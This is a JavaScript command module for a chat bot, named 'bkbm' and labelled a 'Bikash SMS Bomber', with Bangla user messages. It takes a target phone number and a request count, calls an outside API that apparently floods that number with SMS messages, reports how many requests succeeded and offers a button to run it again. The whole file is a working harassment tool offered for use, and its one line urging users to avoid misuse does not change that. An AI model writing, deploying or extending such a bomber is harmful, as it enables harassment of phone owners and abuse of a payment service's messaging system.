const axios = require('axios');
const dipto = "https://www.noobs-api.rf.gd";

module.exports = {
  config: {
    name: "bkbm",
    version: "3.0",
    author: "Shaon Ahmed",
    role: 1 ,
    description: "Bikash SMS Bomber (message.reply style)",
    command: "/bkbm [number] [limit]",
    cooldown: 5
  },

  run: async (message, match) => {
    const number = match[1];
    const limit = match[2] || 10;

    if (!number)
      return message.reply("❌ | ফোন নম্বর দিন!");

    if (!/^[0-9]+$/.test(number))
      return message.reply("❌ | সঠিক ফোন নম্বর দিন!");

    if (limit > 15)
      return message.reply("❌ | সর্বোচ্চ সীমা 15!");

    await message.reply("⏳ | Bikash Bomber চালু হচ্ছে...");

    try {
      const { data } = await axios.get(`${dipto}/dipto/bikashBomber?number=${encodeURIComponent(number)}&limit=${limit}`);

      const caption = `
💣 Bikash SMS Bomber 🔥

📱 টার্গেট: ${number}
📦 রিকোয়েস্ট: ${limit}

✅ সফল: ${data.success}
❌ ব্যর্থ: ${data.failed}
🔢 মোট: ${data.success + data.failed}

📊 স্ট্যাটাস: ${data.message}
⚠️ অপব্যবহার থেকে বিরত থাকুন!
      `.trim();

      return message.reply(caption, {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🚀 আবার চালাও", callback_data: `bkbm_again:${number}:${limit}` },
              { text: "❌ বন্ধ করো", callback_data: "bkbm_cancel" }
            ]
          ]
        }
      });

    } catch (err) {
      console.error(err);
      return message.reply(`❌ | অনুরোধ ব্যর্থ: ${err.message}`);
    }
  }
};
